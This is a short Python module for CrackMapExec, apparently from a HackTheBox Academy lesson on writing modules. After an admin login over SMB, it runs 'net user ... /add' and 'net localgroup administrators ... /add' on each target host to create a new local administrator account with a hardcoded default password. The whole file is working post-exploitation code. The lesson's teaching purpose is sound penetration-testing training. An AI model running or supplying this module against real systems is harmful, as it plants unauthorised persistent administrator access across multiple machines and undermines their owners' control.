# Example from HTB that will create a new admin account

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

class CMEModule:
    '''
        Created to teach HackTheBox Academy students how to create a module for CrackMapExec
        Reference: https://academy.hackthebox.com/

        Module by @juliourena 
    '''

    name = 'createadmin'
    description = "Create a new administrator account"
    supported_protocols = ['smb']
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        '''
        USER    Choose a username for the administrator account. Default: plaintext
        PASS    Choose a password for the administrator. Default: HackTheBoxCME1337!
        '''

        self.user = "plaintext"
        if 'USER' in module_options:
            if module_options['USER'] == "":
                context.log.error('Invalid value for USER option!')
                exit(1)
            self.user = module_options['USER']

        self.password = "HackTheBoxCME1337!"
        if 'PASS' in module_options:
            if module_options['PASS'] == "":
                context.log.error('Invalid value for PASS option!')
                exit(1)
            self.password = module_options['PASS']

    def on_admin_login(self, context, connection):
        context.log.info('Creating user with the following values: USER {} and PASS {}'.format(self.user,self.password))
        command = '(net user ' + self.user + ' "' + self.password + '" /add /Y && net localgroup administrators ' + self.user + ' /add)'
        context.log.info('Executing command')
        p = connection.execute(command, True)
        context.log.highlight(p)